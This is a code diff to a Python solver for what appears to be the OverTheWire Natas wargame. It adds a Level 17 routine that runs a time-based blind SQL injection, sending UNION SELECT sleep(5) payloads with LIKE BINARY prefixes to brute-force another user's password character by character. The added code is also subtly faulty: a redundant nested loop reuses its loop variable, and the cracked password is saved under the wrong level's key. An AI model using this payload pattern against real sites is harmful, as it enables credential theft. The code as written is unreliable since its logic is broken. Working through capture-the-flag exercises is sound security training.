@@ -3,6 +3,8 @@ import re
 from bs4 import BeautifulSoup, Comment
 import base64
 from urllib.parse import unquote
+import string
+import time
 
 url_dict = {}
 
@@ -394,5 +396,34 @@ try:
 
 except requests.exceptions.RequestException as e:
   print(f"HTTP Request failed: {e}")
+
+# Level 17
+try:
+  chars = string.ascii_letters + string.digits
+  password = ""
+  print("\nLevel 17")
+  print("Sending Time-Based Blind SQL Payload")
+  while len(password) != 32:
+    for char in chars:
+      found_char = False
+      for char in chars:
+        candidate = password + char
+        payload = f'" UNION SELECT 1,sleep(5) FROM users where username = "natas18" and password LIKE BINARY "{candidate}%"; -- -'
+        start_time = time.time()
+        response = requests.post(url=url_dict["natas17"]+"/index.php",auth=cred_dict["natas17"],data={"username": payload})
+        elapsed = time.time() - start_time
+        if elapsed > 4.5:
+          password += char
+          print(f"Found char: {char} | Password so far: {password}")
+          found_char = True
+          break
+      if not found_char:
+        print("No matching character found.")
+        break
+  cred_dict["natas17"] = ("natas17",password)
+  
+except requests.exceptions.RequestException as e:
+  print(f"HTTP Request failed: {e}")
+
 
 print(cred_dict)
